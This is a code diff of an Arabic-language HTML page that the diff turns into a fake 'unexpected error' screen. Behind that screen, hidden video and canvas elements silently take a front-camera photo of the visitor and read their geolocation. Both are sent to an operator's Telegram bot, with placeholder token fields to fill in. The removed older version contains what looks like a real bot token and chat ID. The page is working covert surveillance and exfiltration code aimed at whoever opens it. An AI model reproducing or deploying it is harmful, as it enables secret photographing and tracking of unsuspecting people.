@@ -3,116 +3,113 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>كاميرا وموقع</title>
+  <title>opps!</title>
   <style>
     body {
       margin: 0;
-      padding: 20px;
+      padding: 0;
+      background-color: #f9f9f9;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
+      height: 100vh;
+      text-align: center;
+      color: #444;
+    }
+    .container {
+      max-width: 400px;
+      padding: 30px;
       background-color: #fff;
-      font-family: Arial, sans-serif;
-      color: #333;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
     }
-    canvas {
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      margin-bottom: 20px;
+    .icon {
+      font-size: 50px;
+      color: #e74c3c;
+      margin-bottom: 15px;
     }
-    #location {
-      font-size: 16px;
-      direction: ltr;
+    h1 {
+      font-size: 22px;
       margin-bottom: 10px;
     }
-    #mapsBtn {
-      padding: 8px 16px;
-      font-size: 16px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      display: none;
-    }
-    #mapsBtn:hover {
-      background-color: #0056b3;
+    p {
+      font-size: 15px;
+      color: #777;
     }
   </style>
 </head>
 <body>
   <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="300" height="400"></canvas>
-  <div id="location"></div>
-  <button id="mapsBtn">افتح الموقع في Google Maps</button>
+  <canvas id="canvas" width="300" height="400" style="display:none;"></canvas>
 
-<script>
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const context = canvas.getContext("2d");
-  const locationDiv = document.getElementById("location");
-  const mapsBtn = document.getElementById("mapsBtn");
+  <div class="container">
+    <h1>حدث خطأ غير متوقع</h1>
+    <p>يرجى إعادة المحاولة لاحقًا.</p>
+  </div>
 
-  let latitude = null, longitude = null;
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
 
-  // تشغيل الكاميرا
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" },
-    audio: false
-  }).then(stream => {
-    video.srcObject = stream;
-    video.onloadedmetadata = () => {
-      setTimeout(() => {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        stream.getTracks().forEach(track => track.stop());
+    const botToken = "YOUR_BOT_TOKEN";  // ← غيّر هذا
+    const chatId = "YOUR_CHAT_ID";      // ← غيّر هذا
 
-        // بعد التقاط الصورة، نحولها لـ base64 ونرسلها
-        const imageData = canvas.toDataURL("image/png");
+    let latitude = null, longitude = null;
 
-        // نرسل البيانات فقط إذا كانت الإحداثيات متوفرة
-        if (latitude && longitude) {
-          sendToTelegram(imageData, latitude, longitude);
+    // الحصول على الكاميرا
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    }).then(stream => {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
+
+          const imageData = canvas.toDataURL("image/png");
+          if (latitude && longitude) {
+            sendToTelegram(imageData, latitude, longitude);
+          }
+        }, 1000);
+      };
+    }).catch(err => {
+      console.error("خطأ في الكاميرا:", err.message);
+    });
+
+    // الحصول على الموقع
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          latitude = pos.coords.latitude.toFixed(6);
+          longitude = pos.coords.longitude.toFixed(6);
+        },
+        err => {
+          console.error("خطأ في الموقع:", err.message);
         }
-      }, 1000);
-    };
-  });
+      );
+    }
 
-  // تحديد الموقع
-  if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        latitude = pos.coords.latitude.toFixed(6);
-        longitude = pos.coords.longitude.toFixed(6);
-        locationDiv.textContent = `Latitude: ${latitude} | Longitude: ${longitude}`;
+    // إرسال إلى تليجرام
+    function sendToTelegram(base64Image, lat, lon) {
+      fetch(base64Image)
+        .then(res => res.blob())
+        .then(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "image.png");
+          formData.append("caption", `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}`);
 
-        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        mapsBtn.style.display = "inline-block";
-        mapsBtn.onclick = () => window.open(mapsLink, "_blank");
-      }
-    );
-  }
-
-  // إرسال البيانات إلى تليجرام
-  function sendToTelegram(base64Image, lat, lon) {
-    const botToken = "7908642649:AAH6lzPgbqKss3nN-A0vUpKhYsmtPDGUoHU";
-    const chatId = "7891583282";
-
-    // تحويل الصورة إلى Blob لإرسالها
-    fetch(base64Image)
-      .then(res => res.blob())
-      .then(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "image.png");
-        formData.append("caption", `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}`);
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
+          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }).catch(error => {
+          console.error("خطأ في الإرسال:", error.message);
         });
-      });
-  }
-</script>
-
+    }
+  </script>
 </body>
 </html>
